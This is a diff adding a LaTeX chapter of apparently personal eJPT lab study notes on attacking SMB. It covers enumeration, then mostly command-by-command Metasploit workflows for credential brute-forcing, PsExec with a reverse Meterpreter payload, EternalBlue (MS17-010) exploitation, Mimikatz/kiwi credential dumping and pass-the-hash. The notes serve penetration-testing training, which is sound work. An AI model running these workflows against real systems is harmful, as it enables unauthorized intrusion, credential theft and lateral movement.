@@ -1,0 +1,323 @@
+\chapter{SMB --- Server Message Block}
+\label{ch:smb}
+
+SMB is one of the most exploited protocols in Windows environments. From credential
+brute-forcing with PsExec to unauthenticated remote code execution via EternalBlue,
+understanding SMB deeply is essential for the eJPT and for real engagements.
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{What SMB Is}
+\label{sec:smb_theory}
+
+SMB (Server Message Block) is a network file-sharing protocol used to facilitate
+sharing of files, printers, and serial ports between computers on a local network.
+
+\textbf{Key facts:}
+\begin{itemize}
+  \item SMB runs on \textbf{port 445 (TCP)}. Originally it ran on top of
+        NetBIOS using port 139.
+  \item \textbf{SAMBA} is the open-source Linux implementation of SMB, allowing
+        Windows systems to access Linux shares.
+  \item SMB is used for Windows while SAMBA is used on Linux --- but both speak
+        the same protocol.
+\end{itemize}
+
+\begin{whybox}[Why SMB matters in pentesting]
+SMB is enabled by default on every Windows machine and is one of the most
+historically vulnerable services. It was the vector for WannaCry, NotPetya, and
+countless real-world breaches. Finding port 445 open is always worth investigating
+deeply.
+\end{whybox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{SMB Authentication}
+\label{sec:smb_auth}
+
+SMB uses two levels of authentication:
+
+\begin{enumerate}
+  \item \textbf{User authentication} --- username and password required to access
+        the SMB server and its shares. This is the standard mode.
+  \item \textbf{Share authentication} --- a password is set on the share itself,
+        not tied to a user account.
+\end{enumerate}
+
+\begin{notebox}[Null sessions]
+Some SMB configurations allow \textit{null sessions} --- connecting without any
+credentials. This was common on older Windows versions and still appears on
+misconfigured legacy systems. Always try null session first.
+\end{notebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{SMB Enumeration Commands}
+\label{sec:smb_enum_commands}
+
+\begin{notebox}
+Full enumeration workflow is in Chapter~\ref{ch:enumeration}. These are the
+SMB-specific commands to reference quickly.
+\end{notebox}
+
+
+
+\begin{termbox}
+# List shares (guest access)
+smbclient -L \\\\target_ip\\
+
+# Null session attempt
+smbclient -L demo.ine.local -N
+
+# Connect to a specific share
+smbclient \\\\target_ip\\share_name -U username
+
+# Anonymous RPC connection
+rpcclient -U "" -N demo.ine.local
+
+# OS discovery via SMB
+nmap --script smb-os-discovery.nse -p 445 target_ip
+
+# Check SMB version and signing
+nmap -sV -sC -p 445 target_ip
+
+# Check EternalBlue vulnerability specifically
+sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 target_ip
+\end{termbox}
+
+\begin{notebox}[Null sessions]
+
+\screenshot{assets/images/Screenshot_2025-08-23_at_1.23.32_PM.png}{SMB enumeration showing shares and OS information}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{SMB Exploitation with PsExec}
+\label{sec:smb_psexec}
+
+\subsection{What PsExec Is}
+
+PsExec is a lightweight telnet-replacement developed by Microsoft that allows
+executing processes on remote Windows systems using any user's credentials. It
+authenticates via SMB, uploads a small service binary, and executes it remotely.
+
+\textbf{Why it matters:}
+\begin{itemize}
+  \item No CVE required --- this is legitimate credential abuse
+  \item Gives a full command shell or Meterpreter session on the target
+  \item Very similar to RDP, but command-line instead of GUI
+  \item Used in real engagements every day --- if you have admin credentials,
+        PsExec gets you in
+\end{itemize}
+
+\subsection{PsExec Attack Flow}
+
+\begin{enumerate}
+  \item Identify open SMB on port 445
+  \item Brute-force credentials using \ic{smb\_login}
+  \item Use administrator credentials with \ic{exploit/windows/smb/psexec}
+  \item Receive Meterpreter session
+\end{enumerate}
+
+\subsection{PsExec Commands}
+
+\begin{termbox}
+# Step 1 --- confirm SMB is open and get OS info
+nmap -sV -sC target_ip
+
+# Step 2 --- start Metasploit
+service postgresql start && msfconsole
+workspace -a smb_psexec
+
+# Step 3 --- brute-force SMB credentials
+search smb_login
+use auxiliary/scanner/smb/smb_login
+set RHOST target_ip
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+
+# Step 4 --- use psexec with found administrator credentials
+search psexec
+use exploit/windows/smb/psexec
+set RHOST target_ip
+set SMBUser Administrator
+set SMBPass found_password
+set LHOST my_kali_vpn_ip
+exploit
+
+# Step 5 --- post-exploitation
+sysinfo
+getuid
+cd /
+ls
+cat flag.txt
+\end{termbox}
+
+\screenshot{assets/images/Screenshot_2025-08-23_at_1.33.05_PM.png}{smb\_login brute-force finding valid credentials}
+
+\screenshot{assets/images/Screenshot_2025-08-23_at_1.41.00_PM.png}{PsExec exploit opening Meterpreter session as Administrator}
+
+\begin{notebox}[PSexec payload options]
+If you want a Meterpreter session with a payload (instead of just logging in
+with credentials), add the payload steps:
+\begin{termbox}
+set payload windows/meterpreter/reverse_tcp
+show options
+# Confirm LHOST and LPORT are set correctly
+exploit
+\end{termbox}
+The session without a payload logs in legitimately with no backdoor.
+The session with a payload creates a Meterpreter connection but is more detectable.
+\end{notebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{EternalBlue --- MS17-010}
+\label{sec:eternalblue}
+
+\begin{warnbox}[Critical warning]
+EternalBlue only works on SMBv1. Do not run this exploit until memory options
+are correctly set. Targeting kernel space memory without correct configuration
+can crash the target system.
+\end{warnbox}
+
+\subsection{What EternalBlue Is}
+
+EternalBlue (MS17-010 / CVE-2017-0144) is a collection of Windows vulnerabilities
+that allow attackers to remotely execute arbitrary code without authentication by
+sending specially crafted packets to the SMBv1 service.
+
+\textbf{History:}
+\begin{itemize}
+  \item Developed by the NSA as an offensive cyberweapon
+  \item Leaked to the public by the Shadow Brokers hacker group in 2017
+  \item Used in the \textbf{WannaCry ransomware attack} (June 2017), spreading
+        across networks globally in hours
+  \item Patched by Microsoft in MS17-010, but unpatched systems remain common
+\end{itemize}
+
+\textbf{Affected systems:}
+\begin{itemize}
+  \item Windows Vista, 7, 8.1
+  \item Windows Server 2008, 2012, 2016
+  \item Windows 10 (pre-patch)
+\end{itemize}
+
+\subsection{EternalBlue Attack Flow}
+
+\begin{termbox}
+# Step 1 --- confirm SMBv1 and check vulnerability
+sudo nmap -sV -p 445 -O target_ip
+sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 target_ip
+# Look for: VULNERABLE in output
+
+# Step 2 --- Metasploit EternalBlue
+service postgresql start && msfconsole
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOST target_ip
+set LHOST my_ip
+set LPORT listening_port
+run
+
+# Step 3 --- post-exploitation
+sysinfo
+getuid
+\end{termbox}
+
+\screenshot{assets/images/Screenshot_2025-08-24_at_10.23.57_AM.png}{nmap confirming MS17-010 vulnerability before exploitation}
+
+\screenshot{assets/images/Screenshot_2025-08-24_at_10.28.56_AM.png}{EternalBlue exploit running and opening Meterpreter session}
+
+\screenshot{assets/images/Screenshot_2025-08-24_at_10.34.02_AM.png}{Post-exploitation sysinfo and getuid confirming SYSTEM access}
+
+\screenshot{assets/images/Screenshot_2025-08-24_at_10.36.53_AM.png}{EternalBlue session with full SYSTEM privileges}
+
+\subsection{Post-EternalBlue --- Credential Dumping with Kiwi}
+
+Once you have a SYSTEM Meterpreter session via EternalBlue, you can dump
+credentials from memory using \tool{kiwi} (the Metasploit implementation of
+Mimikatz).
+
+\begin{termbox}
+# Inside Meterpreter session
+load kiwi
+creds_all           # Dump all credentials
+lsa_dump_sam        # Dump SAM database hashes
+lsa_dump_secrets    # Dump LSA secrets
+
+# Find running processes to migrate into
+pgrep              # List process IDs
+migrate <PID>      # Migrate into a stable process before loading kiwi
+\end{termbox}
+
+\subsection{Hashdump and Using Hashes with PsExec}
+
+\begin{termbox}
+# Dump password hashes from the SAM database
+hashdump
+
+# The output format is: username:RID:LM_hash:NTLM_hash:::
+# Copy the NTLM hash for pass-the-hash attacks
+
+# Use hash directly in psexec (pass-the-hash)
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass <NTLM_hash_copied_from_hashdump>
+# Format: aad3b435b51404eeaad3b435b51404ee:NTLM_hash
+exploit
+\end{termbox}
+
+\begin{notebox}[Background a session]
+\ic{Ctrl+Z} puts the current Meterpreter session into the background without
+closing it. Use \ic{sessions} to list all sessions and \ic{sessions -i N} to
+reconnect to session number N.
+\end{notebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{Learning Output}
+
+\begin{takebox}
+\textbf{What I Learned}
+\begin{itemize}
+  \item SMB is not just a file sharing protocol --- it is the most historically
+        significant attack surface in Windows environments.
+  \item PsExec with admin credentials is cleaner than exploiting a CVE. No
+        system crash risk, no AV trigger on a generic payload, and it's the
+        technique used in real engagements.
+  \item EternalBlue is devastating but requires SMBv1. Modern systems are
+        patched --- but legacy infrastructure in enterprises still runs it.
+  \item \ic{VERBOSE false} on brute-force is essential. Thousands of failed
+        lines make it impossible to spot the hit.
+\end{itemize}
+
+\textbf{Enumeration Mindset --- What to Check First When Port 445 is Open}
+\begin{enumerate}
+  \item \ic{nmap -sV -sC -p 445 target} --- get SMB version and signing status
+  \item \ic{nmap --script smb-vuln-ms17-010} --- is it EternalBlue vulnerable?
+  \item \ic{smbclient -L target -N} --- null session attempt
+  \item If not vulnerable to EternalBlue: brute-force with \ic{smb\_login}
+  \item If credentials found: PsExec for immediate access
+\end{enumerate}
+
+\textbf{Common Mistakes}
+\begin{itemize}
+  \item Running EternalBlue before checking the target is actually vulnerable ---
+        can crash the system and alert defenders
+  \item Forgetting to set \ic{LHOST} to the VPN interface --- the shell connects
+        nowhere
+  \item Using \ic{set} instead of \ic{setg} when switching modules --- target IP
+        resets and you wonder why the exploit fails
+  \item Running hashdump without migrating to a stable process first --- the session
+        dies mid-dump
+\end{itemize}
+
+\textbf{Real-World Impact}
+\begin{itemize}
+  \item Open 445 + SMBv1 + unpatched = EternalBlue = full SYSTEM access, no
+        credentials needed
+  \item Weak SMB credentials = PsExec = full Administrator access to the machine
+        and anything it can reach on the network
+  \item Credential dump post-exploitation = lateral movement across the entire
+        Windows domain using pass-the-hash
+\end{itemize}
+\end{takebox}
+
+\end{notebox}
